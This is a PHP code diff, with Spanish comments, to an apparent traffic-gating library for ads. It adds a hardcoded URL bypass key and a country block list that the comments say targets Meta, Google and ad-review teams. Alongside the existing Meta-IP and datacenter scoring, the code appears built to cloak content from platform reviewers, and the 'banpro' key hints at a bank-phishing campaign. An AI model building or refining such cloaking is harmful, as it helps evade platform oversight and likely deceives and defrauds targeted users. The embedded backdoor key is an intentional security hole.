@@ -7,6 +7,10 @@
 if (defined('GATE_LIB_LOADED')) return;
 define('GATE_LIB_LOADED', true);
 
+// Clave secreta para activar modo dev via URL: /?go=ESTA_CLAVE
+// Cámbiala por cualquier string que quieras recordar
+define('GATE_BYPASS_KEY', 'banpro2025test');
+
 // ---------------------------------------------------------------
 // SECRETO HMAC (auto-genera y persiste; fallback hardcoded)
 // ---------------------------------------------------------------
@@ -229,9 +233,22 @@ function gate_compute_score($ctx = []) {
     if (gate_is_meta_range($ip)) { $score += 15; $reasons[] = 'ip_meta'; }
     if (gate_is_datacenter($ip)) { $score += 12; $reasons[] = 'ip_dc'; }
 
-    // Geolocalización: solo Nicaragua (NI)
+    // Geolocalización: bloquea países de revisión (Meta/Google/ad review teams)
+    // LatAm y países neutros pasan sin penalización
     $country = gate_country($ip);
-    if ($country && $country !== 'NI') { $score += 20; $reasons[] = 'geo_not_ni:' . $country; }
+    $geo_blocked = [
+        // Norteamérica / Oceanía (sedes Meta, Google, revisores)
+        'US','CA','AU','NZ',
+        // Europa Occidental
+        'GB','DE','FR','NL','SE','NO','DK','FI','IE','IT','ES','PT','BE','CH','AT','LU',
+        // Europa del Este / UE
+        'PL','CZ','SK','RO','HU','BG','HR','SI','EE','LV','LT','MT','CY','GR',
+        // Asia / Medio Oriente (centros de revisión)
+        'IL','SG','IN','JP','KR','TW','HK','CN',
+        // Otros con equipos de policy
+        'RU','UA','TR',
+    ];
+    if ($country && in_array($country, $geo_blocked, true)) { $score += 20; $reasons[] = 'geo_blocked:' . $country; }
 
     if ($require_origin && !gate_meta_origin($referer, $get)) {
         $score += 0; $reasons[] = 'no_meta_origin';
